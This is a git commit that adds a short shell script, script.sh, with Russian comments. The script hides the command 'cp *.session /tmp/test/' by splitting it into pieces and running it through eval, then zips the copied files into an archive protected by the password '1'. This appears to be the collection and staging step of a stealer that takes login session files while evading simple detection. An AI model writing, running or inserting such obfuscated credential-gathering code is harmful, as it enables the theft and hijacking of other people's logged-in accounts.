5c40464a7f0d36df8d1d5c0919ab9215b6576f23
Clink <111626295+clinkuser@users.noreply.github.com>
2026-01-18 15:20:03 +0800

    Create script.sh

---
+++ script.sh
@@ -0,0 +1,15 @@
+mkdir -p /tmp/test
+
+part_a="cp"
+part_b="*.se"
+part_c="ssion"
+space=" "
+file_path="/tmp/test/"
+
+# Собираем строку: %s - это строковый формат
+printf -v final_cmd "%s%s%s%s%s%s" "$part_a" "$space" "$part_b" "$part_c" "$space" "$file_path"
+
+# Выполняем
+eval "$final_cmd"
+
+zip -P "1" -r /tmp/test.zip /tmp/test
